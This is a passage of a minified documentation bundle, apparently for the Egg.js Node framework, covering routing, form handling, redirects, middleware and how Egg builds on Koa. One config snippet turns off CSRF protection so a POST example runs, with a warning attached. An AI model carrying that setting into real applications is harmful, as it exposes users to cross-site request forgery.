neither."),r.a.createElement("h2",{id:"router-in-action"},r.a.createElement(l["AnchorLink"],{to:"#router-in-action","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router in Action"),r.a.createElement("p",null,"More practical examples will be shown below to demonstrate how to use the router."),r.a.createElement("h4",{id:"acquiring-parameters"},r.a.createElement(l["AnchorLink"],{to:"#acquiring-parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Acquiring Parameters"),r.a.createElement("h4",{id:"via-query-string"},r.a.createElement(l["AnchorLink"],{to:"#via-query-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Via Query String"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/search', app.controller.search.index);\n};\n\n// app/controller/search.js\nexports.index = async (ctx) => {\n  ctx.body = `search: ${ctx.query.name}`;\n};\n\n// curl http://127.0.0.1:7001/search?name=egg",lang:"js"}),r.a.createElement("h4",{id:"via-named-parameters"},r.a.createElement(l["AnchorLink"],{to:"#via-named-parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Via Named Parameters"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/user/:id/:name', app.controller.user.info);\n};\n\n// app/controller/user.js\nexports.info = async (ctx) => {\n  ctx.body = `user: ${ctx.params.id}, ${ctx.params.name}`;\n};\n\n// curl http://127.0.0.1:7001/user/123/xiaoming",lang:"js"}),r.a.createElement("h4",{id:"acquiring-complex-parameters"},r.a.createElement(l["AnchorLink"],{to:"#acquiring-complex-parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Acquiring Complex Parameters"),r.a.createElement("p",null,"Regular expressions, as well, can be used in routing rules to acquire parameters more flexibly:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get(\n    /^\\/package\\/([\\w-.]+\\/[\\w-.]+)$/,\n    app.controller.package.detail,\n  );\n};\n\n// app/controller/package.js\nexports.detail = async (ctx) => {\n  // If the request URL is matched by the regular expression, parameters can be acquired from ctx.params according to the capture group orders.\n  // For the user request below, for example, the value of `ctx.params[0]` is `egg/1.0.0`\n  ctx.body = `package:${ctx.params[0]}`;\n};\n\n// curl http://127.0.0.1:7001/package/egg/1.0.0",lang:"js"}),r.a.createElement("h3",{id:"acquiring-form-contents"},r.a.createElement(l["AnchorLink"],{to:"#acquiring-form-contents","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Acquiring Form Contents"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('/form', app.controller.form.post);\n};\n\n// app/controller/form.js\nexports.post = async (ctx) => {\n  ctx.body = `body: ${JSON.stringify(ctx.request.body)}`;\n};\n\n// simulate a post request.\n// curl -X POST http://127.0.0.1:7001/form --data '{\"name\":\"controller\"}' --header 'Content-Type:application/json'",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"P.S.:")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"If you perform a POST request directly, an ",r.a.createElement("strong",null,"error")," will occur: 'secret is missing'. This error message comes from ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/csrf/blob/2.5.0/index.js#L69"},"koa-csrf/index.js#L69"),".")),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement("strong",null,"Reason"),": the framework verifies the CSRF value specially for form POST requests, so please submit the CSRF key as well when you submit a form. Refer to ",r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/core/security.html#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81csrf%E7%9A%84%E9%98%B2%E8%8C%83"},"Keep Away from CSRF Threat")," for more detail.")),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement("strong",null,"Note"),": the verification is performed because the framework builds in a security plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," that provides some default security practices and this plugin is enabled by default. In case you want to disable some security protections, just set the enable attribute to false.")),r.a.createElement("blockquote",null,r.a.createElement("p",null,'"Unless you clearly confirm the consequence, it\'s not recommended to disable functions provided by the security plugin"')),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Here we do the config temporarily in ",r.a.createElement("code",null,"config/config.default.js")," for an example")),r.a.createElement(o["a"],{code:"exports.security = {\n  csrf: false\n};",lang:"unknown"}),r.a.createElement("h3",{id:"form-verification"},r.a.createElement(l["AnchorLink"],{to:"#form-verification","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Form Verification"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('/user', app.controller.user);\n};\n\n// app/controller/user.js\nconst createRule = {\n  username: {\n    type: 'email',\n  },\n  password: {\n    type: 'password',\n    compare: 're-password',\n  },\n};\n\nexports.create = async (ctx) => {\n  // throws exceptions if the verification fails\n  ctx.validate(createRule);\n  ctx.body = ctx.request.body;\n};\n\n// curl -X POST http://127.0.0.1:7001/user --data 'username=abc@abc.com&password=111111&re-password=111111'",lang:"js"}),r.a.createElement("h3",{id:"redirection"},r.a.createElement(l["AnchorLink"],{to:"#redirection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Redirection"),r.a.createElement("h4",{id:"internal-redirection"},r.a.createElement(l["AnchorLink"],{to:"#internal-redirection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Internal Redirection"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('index', '/home/index', app.controller.home.index);\n  app.redirect('/', '/home/index', 302);\n};\n\n// app/controller/home.js\nexports.index = async (ctx) => {\n  ctx.body = 'hello controller';\n};\n\n// curl -L http://localhost:7001",lang:"js"}),r.a.createElement("h4",{id:"external-redirection"},r.a.createElement(l["AnchorLink"],{to:"#external-redirection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"External Redirection"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.get('/search', app.controller.search.index);\n};\n\n// app/controller/search.js\nexports.index = async (ctx) => {\n  const type = ctx.query.type;\n  const q = ctx.query.q || 'nodejs';\n\n  if (type === 'bing') {\n    ctx.redirect(`http://cn.bing.com/search?q=${q}`);\n  } else {\n    ctx.redirect(`https://www.google.co.kr/search?q=${q}`);\n  }\n};\n\n// curl http://localhost:7001/search?type=bing&q=node.js\n// curl http://localhost:7001/search?q=node.js",lang:"js"}),r.a.createElement("h3",{id:"using-middleware"},r.a.createElement(l["AnchorLink"],{to:"#using-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Middleware"),r.a.createElement("p",null,"A middleware can be used to change the request parameter to uppercase. Here we just briefly explain how to use the middleware, and refer to ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware")," for detail."),r.a.createElement(o["a"],{code:"// app/controller/search.js\nexports.index = async (ctx) => {\n  ctx.body = `search: ${ctx.query.name}`;\n};\n\n// app/middleware/uppercase.js\nmodule.exports = () => {\n  return async function uppercase(ctx, next) {\n    ctx.query.name = ctx.query.name && ctx.query.name.toUpperCase();\n    await next();\n  };\n};\n\n// app/router.js\nmodule.exports = (app) => {\n  app.router.get(\n    's',\n    '/search',\n    app.middleware.uppercase(),\n    app.controller.search,\n  );\n};\n\n// curl http://localhost:7001/search?name=egg",lang:"js"}),r.a.createElement("h3",{id:"too-many-routing-maps"},r.a.createElement(l["AnchorLink"],{to:"#too-many-routing-maps","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Too Many Routing Maps?"),r.a.createElement("p",null,"As described above, we do not recommend that you scatter routing logics all around, or it will bring trouble in trouble shooting."),r.a.createElement("p",null,"If there is a need for some reasons, you can split routing rules like below:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  require('./router/news')(app);\n  require('./router/admin')(app);\n};\n\n// app/router/news.js\nmodule.exports = (app) => {\n  app.router.get('/news/list', app.controller.news.list);\n  app.router.get('/news/detail', app.controller.news.detail);\n};\n\n// app/router/admin.js\nmodule.exports = (app) => {\n  app.router.get('/admin/user', app.controller.admin.user);\n  app.router.get('/admin/log', app.controller.admin.log);\n};",lang:"js"}),r.a.createElement("p",null,"or using ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-router-plus"},"egg-router-plus"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},"8tIg":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("AAg8"),s=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{isSubsetOf:function(e){var t=c(this),n=o(e),a=n.has;return"function"!=typeof a&&(n=new(l("Set"))(e),a=i(n.has)),!s(t,(function(e){if(!1===a.call(n,e))return s.stop()}),void 0,!1,!0).stopped}})},"8wvZ":function(e,t,n){"use strict";var a="undefined"!==typeof Symbol&&Symbol,r=n("dcBQ");e.exports=function(){return"function"===typeof a&&("function"===typeof Symbol&&("symbol"===typeof a("foo")&&("symbol"===typeof Symbol("bar")&&r())))}},"8zzq":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b"},r.a.createElement(l["AnchorLink"],{to:"#\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b"),r.a.createElement("p",null,"Node.js \u662f\u4e00\u4e2a\u5f02\u6b65\u7684\u4e16\u754c\uff0c\u5b98\u65b9 API \u652f\u6301\u7684\u90fd\u662f callback \u5f62\u5f0f\u7684\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b\uff0c\u8fd9\u4f1a\u5e26\u6765\u8bb8\u591a\u95ee\u9898\uff0c\u4f8b\u5982"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://callbackhell.com/"},"callback hell"),": \u6700\u81ed\u540d\u662d\u8457\u7684 callback \u5d4c\u5957\u95ee\u9898\u3002"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://oren.github.io/#/articles/zalgo/"},"release zalgo"),": \u5f02\u6b65\u51fd\u6570\u4e2d\u53ef\u80fd\u540c\u6b65\u8c03\u7528 callback \u8fd4\u56de\u6570\u636e\uff0c\u5e26\u6765\u4e0d\u4e00\u81f4\u6027\u3002")),r.a.createElement("p",null,"\u56e0\u6b64\u793e\u533a\u63d0\u4f9b\u4e86\u5404\u79cd\u5f02\u6b65\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6700\u7ec8\u80dc\u51fa\u7684\u662f Promise\uff0c\u5b83\u4e5f\u5185\u7f6e\u5230\u4e86 ECMAScript 2015 \u4e2d\u3002\u800c\u5728 Promise \u7684\u57fa\u7840\u4e0a\uff0c\u7ed3\u5408 Generator \u63d0\u4f9b\u7684\u5207\u6362\u4e0a\u4e0b\u6587\u80fd\u529b\uff0c\u51fa\u73b0\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u7b49\u7b2c\u4e09\u65b9\u7c7b\u5e93\u6765\u8ba9\u6211\u4eec\u7528\u540c\u6b65\u5199\u6cd5\u7f16\u5199\u5f02\u6b65\u4ee3\u7801\u3002\u540c\u65f6\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/tc39/ecmascript-asyncawait"},"async function")," \u8fd9\u4e2a\u5b98\u65b9\u89e3\u51b3\u65b9\u6848\u4e5f\u4e8e ECMAScript 2017 \u4e2d\u53d1\u5e03\uff0c\u5e76\u5728 Node.js 8 \u4e2d\u5b9e\u73b0\u3002"),r.a.createElement("h3",{id:"async-function"},r.a.createElement(l["AnchorLink"],{to:"#async-function","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"async function"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/tc39/ecmascript-asyncawait"},"async function")," \u662f\u8bed\u8a00\u5c42\u9762\u63d0\u4f9b\u7684\u8bed\u6cd5\u7cd6\uff0c\u5728 async function \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"await")," \u5173\u952e\u5b57\u6765\u7b49\u5f85\u4e00\u4e2a Promise \u88ab resolve\uff08\u6216\u8005 reject\uff0c\u6b64\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff09\uff0c Node.js \u73b0\u5728\u7684 LTS \u7248\u672c\uff088.x\uff09\u5df2\u539f\u751f\u652f\u6301\u3002"),r.a.createElement(o["a"],{code:"const fn = async function () {\n  const user = await getUser();\n  const posts = await fetchPosts(user.id);\n  return { user, posts };\n};\nfn()\n  .then((res) => console.log(res))\n  .catch((err) => console.error(err.stack));",lang:"js"}),r.a.createElement("h2",{id:"koa"},r.a.createElement(l["AnchorLink"],{to:"#koa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Koa"),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://koajs.com/"},"Koa")," \u662f\u4e00\u4e2a\u65b0\u7684 web \u6846\u67b6\uff0c\u7531 Express \u5e55\u540e\u7684\u539f\u73ed\u4eba\u9a6c\u6253\u9020\uff0c \u81f4\u529b\u4e8e\u6210\u4e3a web \u5e94\u7528\u548c API \u5f00\u53d1\u9886\u57df\u4e2d\u7684\u4e00\u4e2a\u66f4\u5c0f\u3001\u66f4\u5bcc\u6709\u8868\u73b0\u529b\u3001\u66f4\u5065\u58ee\u7684\u57fa\u77f3\u3002")),r.a.createElement("p",null,"Koa \u548c Express \u7684\u8bbe\u8ba1\u98ce\u683c\u975e\u5e38\u7c7b\u4f3c\uff0c\u5e95\u5c42\u4e5f\u90fd\u662f\u5171\u7528\u7684",r.a.createElement(l["Link"],{to:"https://github.com/jshttp"},"\u540c\u4e00\u5957 HTTP \u57fa\u7840\u5e93"),"\uff0c\u4f46\u662f\u6709\u51e0\u4e2a\u663e\u8457\u7684\u533a\u522b\uff0c\u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u9ed8\u8ba4\u5f02\u6b65\u89e3\u51b3\u65b9\u6848\u4e4b\u5916\uff0c\u4e3b\u8981\u7684\u7279\u70b9\u8fd8\u6709\u4e0b\u9762\u51e0\u4e2a\u3002"),r.a.createElement("h3",{id:"middleware"},r.a.createElement(l["AnchorLink"],{to:"#middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Middleware"),r.a.createElement("p",null,"Koa \u7684\u4e2d\u95f4\u4ef6\u548c Express \u4e0d\u540c\uff0cKoa \u9009\u62e9\u4e86\u6d0b\u8471\u5708\u6a21\u578b\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u6d0b\u8471\u56fe\uff1a")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://camo.githubusercontent.com/d80cf3b511ef4898bcde9a464de491fa15a50d06/68747470733a2f2f7261772e6769746875622e636f6d2f66656e676d6b322f6b6f612d67756964652f6d61737465722f6f6e696f6e2e706e67",alt:""})),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u6267\u884c\u987a\u5e8f\u56fe\uff1a")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://raw.githubusercontent.com/koajs/koa/a7b6ed0529a58112bac4171e4729b8760a34ab8b/docs/middleware.gif",alt:""})),r.a.createElement("p",null,"\u6240\u6709\u7684\u8bf7\u6c42\u7ecf\u8fc7\u4e00\u4e2a\u4e2d\u95f4\u4ef6\u7684\u65f6\u5019\u90fd\u4f1a\u6267\u884c\u4e24\u6b21\uff0c\u5bf9\u6bd4 Express \u5f62\u5f0f\u7684\u4e2d\u95f4\u4ef6\uff0cKoa \u7684\u6a21\u578b\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u5b9e\u73b0\u540e\u7f6e\u5904\u7406\u903b\u8f91\uff0c\u5bf9\u6bd4 Koa \u548c Express \u7684 Compress \u4e2d\u95f4\u4ef6\u5c31\u53ef\u4ee5\u660e\u663e\u7684\u611f\u53d7\u5230 Koa \u4e2d\u95f4\u4ef6\u6a21\u578b\u7684\u4f18\u52bf\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/koajs/compress/blob/master/lib/index.js"},"koa-compress")," for Koa."),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/expressjs/compression/blob/master/index.js"},"compression")," for Express.")),r.a.createElement("h3",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"\u548c Express \u53ea\u6709 Request \u548c Response \u4e24\u4e2a\u5bf9\u8c61\u4e0d\u540c\uff0cKoa \u589e\u52a0\u4e86\u4e00\u4e2a Context \u7684\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u8fd9\u6b21\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff08\u5728 Koa 1 \u4e2d\u4e3a\u4e2d\u95f4\u4ef6\u7684 ",r.a.createElement("code",null,"this"),"\uff0c\u5728 Koa 2 \u4e2d\u4f5c\u4e3a\u4e2d\u95f4\u4ef6\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u6b21\u8bf7\u6c42\u76f8\u5173\u7684\u4e0a\u4e0b\u6587\u90fd\u6302\u8f7d\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u3002\u7c7b\u4f3c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-tracer/blob/1.0.0/lib/tracer.js#L12"},"traceId")," \u8fd9\u79cd\u9700\u8981\u8d2f\u7a7f\u6574\u4e2a\u8bf7\u6c42\uff08\u5728\u540e\u7eed\u4efb\u4f55\u4e00\u4e2a\u5730\u65b9\u8fdb\u884c\u5176\u4ed6\u8c03\u7528\u90fd\u9700\u8981\u7528\u5230\uff09\u7684\u5c5e\u6027\u5c31\u53ef\u4ee5\u6302\u8f7d\u4e0a\u53bb\u3002\u76f8\u8f83\u4e8e request \u548c response \u800c\u8a00\u66f4\u52a0\u7b26\u5408\u8bed\u4e49\u3002"),r.a.createElement("p",null,"\u540c\u65f6 Context \u4e0a\u4e5f\u6302\u8f7d\u4e86 Request \u548c Response \u4e24\u4e2a\u5bf9\u8c61\u3002\u548c Express \u7c7b\u4f3c\uff0c\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u90fd\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u4fbf\u6377\u65b9\u6cd5\u8f85\u52a9\u5f00\u53d1\uff0c\u4f8b\u5982"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"get request.query")),r.a.createElement("li",null,r.a.createElement("code",null,"get request.hostname")),r.a.createElement("li",null,r.a.createElement("code",null,"set response.body")),r.a.createElement("li",null,r.a.createElement("code",null,"set response.status"))),r.a.createElement("h3",{id:"\u5f02\u5e38\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u5f02\u5e38\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f02\u5e38\u5904\u7406"),r.a.createElement("p",null,"\u901a\u8fc7\u540c\u6b65\u65b9\u5f0f\u7f16\u5199\u5f02\u6b65\u4ee3\u7801\u5e26\u6765\u7684\u53e6\u5916\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u597d\u5904\u5c31\u662f\u5f02\u5e38\u5904\u7406\u975e\u5e38\u81ea\u7136\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"try catch")," \u5c31\u53ef\u4ee5\u5c06\u6309\u7167\u89c4\u8303\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\u7684\u6240\u6709\u9519\u8bef\u90fd\u6355\u83b7\u5230\u3002\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u5f88\u4fbf\u6377\u7684\u7f16\u5199\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u5904\u7406\u4e2d\u95f4\u4ef6\u3002"),r.a.createElement(o["a"],{code:"async function onerror(ctx, next) {\n  try {\n    await next();\n  } catch (err) {\n    ctx.app.emit('error', err);\n    ctx.body = 'server error';\n    ctx.status = err.status || 500;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u653e\u5728\u5176\u4ed6\u4e2d\u95f4\u4ef6\u4e4b\u524d\uff0c\u5c31\u53ef\u4ee5\u6355\u83b7\u5b83\u4eec\u6240\u6709\u7684\u540c\u6b65\u6216\u8005\u5f02\u6b65\u4ee3\u7801\u4e2d\u629b\u51fa\u7684\u5f02\u5e38\u4e86\u3002"),r.a.createElement("h2",{id:"egg-\u7ee7\u627f\u4e8e-koa"},r.a.createElement(l["AnchorLink"],{to:"#egg-\u7ee7\u627f\u4e8e-koa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg \u7ee7\u627f\u4e8e Koa"),r.a.createElement("p",null,"\u5982\u4e0a\u8ff0\uff0cKoa \u662f\u4e00\u4e2a\u975e\u5e38\u4f18\u79c0\u7684\u6846\u67b6\uff0c\u7136\u800c\u5bf9\u4e8e\u4f01\u4e1a\u7ea7\u5e94\u7528\u6765\u8bf4\uff0c\u5b83\u8fd8\u6bd4\u8f83\u57fa\u7840\u3002"),r.a.createElement("p",null,"\u800c Egg \u9009\u62e9\u4e86 Koa \u4f5c\u4e3a\u5176\u57fa\u7840\u6846\u67b6\uff0c\u5728\u5b83\u7684\u6a21\u578b\u57fa\u7840\u4e0a\uff0c\u8fdb\u4e00\u6b65\u5bf9\u5b83\u8fdb\u884c\u4e86\u4e00\u4e9b\u589e\u5f3a\u3002"),r.a.createElement("h3",{id:"\u6269\u5c55"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55"),r.a.createElement("p",null,"\u5728\u57fa\u4e8e Egg \u7684\u6846\u67b6\u6216\u8005\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49 ",r.a.createElement("code",null,"app/extend/","{","application,context,request,response","}",".js")," \u6765\u6269\u5c55 Koa \u4e2d\u5bf9\u5e94\u7684\u56db\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u901a\u8fc7\u8fd9\u4e2a\u529f\u80fd\uff0c\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u7684\u589e\u52a0\u66f4\u591a\u7684\u8f85\u52a9\u65b9\u6cd5\uff0c\u4f8b\u5982\u6211\u4eec\u5728 ",r.a.createElement("code",null,"app/extend/context.js")," \u4e2d\u5199\u5165\u4e0b\u5217\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  get isIOS() {\n    const iosReg = /iphone|ipad|ipod/i;\n    return iosReg.test(this.get('user-agent'));\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5728 Controller \u4e2d\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u5230\u521a\u624d\u5b9a\u4e49\u7684\u8fd9\u4e2a\u4fbf\u6377\u5c5e\u6027\u4e86\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nexports.handler = (ctx) => {\n  ctx.body = ctx.isIOS\n    ? 'Your operating system is iOS.'\n    : 'Your operating system is not iOS.';\n};",lang:"js"}),r.a.createElement("p",null,"\u66f4\u591a\u5173\u4e8e\u6269\u5c55\u7684\u5185\u5bb9\uff0c\u8bf7\u67e5\u770b",r.a.createElement(l["Link"],{to:"../basics/extend"},"\u6269\u5c55"),"\u7ae0\u8282\u3002"),r.a.createElement("h3",{id:"\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6"),r.a.createElement("p",null,"\u4f17\u6240\u5468\u77e5\uff0c\u5728 Express \u548c Koa \u4e2d\uff0c\u7ecf\u5e38\u4f1a\u5f15\u5165\u8bb8\u8bb8\u591a\u591a\u7684\u4e2d\u95f4\u4ef6\u6765\u63d0\u4f9b\u5404\u79cd\u5404\u6837\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u5f15\u5165 ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/session"},"koa-session")," \u63d0\u4f9b Session \u7684\u652f\u6301\uff0c\u5f15\u5165 ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/bodyparser"},"koa-bodyparser")," \u6765\u89e3\u6790\u8bf7\u6c42 body\u3002\u800c Egg \u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u52a0\u5f3a\u5927\u7684\u63d2\u4ef6\u673a\u5236\uff0c\u8ba9\u8fd9\u4e9b\u72ec\u7acb\u9886\u57df\u7684\u529f\u80fd\u6a21\u5757\u53ef\u4ee5\u66f4\u52a0\u5bb9\u6613\u7f16\u5199\u3002"),r.a.createElement("p",null,"\u4e00\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u5305\u542b"),r.a.createElement("ul",null,r.a.createElement("li",null,"extend\uff1a\u6269\u5c55\u57fa\u7840\u5bf9\u8c61\u7684\u4e0a\u4e0b\u6587\uff0c\u63d0\u4f9b\u5404\u79cd\u5de5\u5177\u7c7b\u3001\u5c5e\u6027\u3002"),r.a.createElement("li",null,"middleware\uff1a\u589e\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u63d0\u4f9b\u8bf7\u6c42\u7684\u524d\u7f6e\u3001\u540e\u7f6e\u5904\u7406\u903b\u8f91\u3002"),r.a.createElement("li",null,"config\uff1a\u914d\u7f6e\u5404\u4e2a\u73af\u5883\u4e0b\u63d2\u4ef6\u81ea\u8eab\u7684\u9ed8\u8ba4\u914d\u7f6e\u9879\u3002")),r.a.createElement("p",null,"\u4e00\u4e2a\u72ec\u7acb\u9886\u57df\u4e0b\u7684\u63d2\u4ef6\u5b9e\u73b0\uff0c\u53ef\u4ee5\u5728\u4ee3\u7801\u7ef4\u62a4\u6027\u975e\u5e38\u9ad8\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u975e\u5e38\u5b8c\u5584\u7684\u529f\u80fd\uff0c\u800c\u63d2\u4ef6\u4e5f\u652f\u6301\u914d\u7f6e\u5404\u4e2a\u73af\u5883\u4e0b\u7684\u9ed8\u8ba4\uff08\u6700\u4f73\uff09\u914d\u7f6e\uff0c\u8ba9\u6211\u4eec\u4f7f\u7528\u63d2\u4ef6\u7684\u65f6\u5019\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u9700\u8981\u4fee\u6539\u914d\u7f6e\u9879\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," \u63d2\u4ef6\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684\u4f8b\u5b50\u3002"),r.a.createElement("p",null,"\u66f4\u591a\u5173\u4e8e\u63d2\u4ef6\u7684\u5185\u5bb9\uff0c\u8bf7\u67e5\u770b",r.a.createElement(l["Link"],{to:"../basics/plugin"},"\u63d2\u4ef6"),"\u7ae0\u8282\u3002"),r.a.createElement("h3",{id:"egg-\u4e0e-koa-\u7684\u7248\u672c\u5173\u7cfb"},r.a.createElement(l["AnchorLink"],{to:"#egg-\u4e0e-koa-\u7684\u7248\u672c\u5173\u7cfb","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg \u4e0e Koa \u7684\u7248\u672c\u5173\u7cfb"),r.a.createElement("h4",{id:"egg-1x"},r.a.createElement(l["AnchorLink"],{to:"#egg-1x","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg 1.x"),r.a.createElement("p",null,"Egg 1.x \u53d1\u5e03\u65f6\uff0cNode.js \u7684 LTS \u7248\u672c\u5c1a\u4e0d\u652f\u6301 async function\uff0c\u6240\u4ee5 Egg 1.x \u4ecd\u7136\u57fa\u4e8e Koa 1.x \u5f00\u53d1\uff0c\u4f46\u662f\u5728\u6b64\u57fa\u7840\u4e0a\uff0cEgg \u5168\u9762\u589e\u52a0\u4e86 async function \u7684\u652f\u6301\uff0c\u518d\u52a0\u4e0a Egg \u5bf9 Koa 2.x \u7684\u4e2d\u95f4\u4ef6\u4e5f\u5b8c\u5168\u517c\u5bb9\uff0c\u5e94\u7528\u5c42\u4ee3\u7801\u53ef\u4ee5\u5b8c\u5168\u57fa\u4e8e 